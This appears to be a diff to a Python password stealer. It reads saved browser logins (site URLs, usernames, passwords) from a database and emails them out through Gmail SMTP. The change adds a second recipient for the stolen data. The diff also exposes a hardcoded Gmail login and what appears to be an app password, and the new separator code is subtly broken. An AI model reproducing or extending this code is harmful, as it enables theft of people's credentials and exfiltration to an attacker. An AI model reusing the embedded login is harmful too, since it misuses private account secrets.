@@ -68,9 +68,8 @@ def main():
     cursor.execute(
         "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
     # iterate over all rows
-    lista = ['senhas\n']
-    lista.append(
-        'SENHAS:\n-------------------------------------------------------------------------------------------------------------\n')
+    lista = ['SENHAS↓↓↓\n\n']
+    separador = '=' * 50, '\n'
     for row in cursor.fetchall():
         origin_url = row[0]
         action_url = row[1]
@@ -88,8 +87,7 @@ def main():
             lista.append(f"Action URL: {action_url}\n")
             lista.append(f"Username: {username}\n")
             lista.append(f"Password: {password}\n")
-            lista.append(
-                '\n-------------------------------------------------------------------------------------------------------------\n')
+            lista.append(separador)
 
         else:
             continue
@@ -111,7 +109,11 @@ def main():
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.login("jeffersonssantos93@gmail.com", "muzwoulszlsmoqjx")
         server.sendmail('jeffersonssantos@gmail.com',
+                        'jeffersonssantos93@gmail.com', result.encode('utf-8'))
+
+        server.sendmail('jeffersonssantos@gmail.com',
                         'jeffersonssantos92@gmail.com', result.encode('utf-8'))
+
         server.quit()
     print(result)
     enviaInformacao()
